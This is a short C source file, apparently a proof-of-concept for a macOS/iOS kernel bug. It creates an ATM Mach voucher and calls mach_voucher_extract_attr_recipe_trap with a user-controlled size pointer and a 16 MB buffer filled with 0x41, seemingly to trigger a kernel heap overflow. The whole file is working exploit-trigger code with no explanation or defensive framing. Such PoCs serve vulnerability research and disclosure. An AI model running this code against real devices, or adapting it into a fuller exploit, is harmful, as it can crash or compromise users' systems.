#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_error.h>
#include <mach/mach_traps.h>
#include <mach/mach_voucher_types.h>

#include <atm/atm_types.h>


mach_port_t get_voucher() {
  mach_voucher_attr_recipe_data_t r = {
    .key = MACH_VOUCHER_ATTR_KEY_ATM,
    .command = MACH_VOUCHER_ATTR_ATM_CREATE
  };
  mach_port_t p = MACH_PORT_NULL;
  kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&r, sizeof(r), &p);

  if (err != KERN_SUCCESS) {
    printf("failed to create voucher (%s)\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
   printf("got voucher: %x\n", p);

  return p;
}

uint64_t map(uint64_t addr, uint64_t size) {
  uint64_t _addr = addr;
  kern_return_t err = mach_vm_allocate(mach_task_self(), &_addr, size, 0);
  if (err != KERN_SUCCESS || _addr != addr) {
    printf("failed to allocate fixed mapping: %s\n", mach_error_string(err));
    exit(EXIT_FAILURE);
  }
  return addr;
}

int main() {
  void* recipe_size = (void*)map(0x123450000, 0x1000);
  *(uint64_t*)recipe_size = 0x1000;

  uint64_t size = 0x1000000;
  void* recipe = malloc(size);
  memset(recipe, 0x41, size);

  mach_port_t port = get_voucher();
  kern_return_t err = mach_voucher_extract_attr_recipe_trap(
      port,
      1,
      recipe,
      recipe_size);

  printf("%s\n", mach_error_string(err));

  return 41;
}
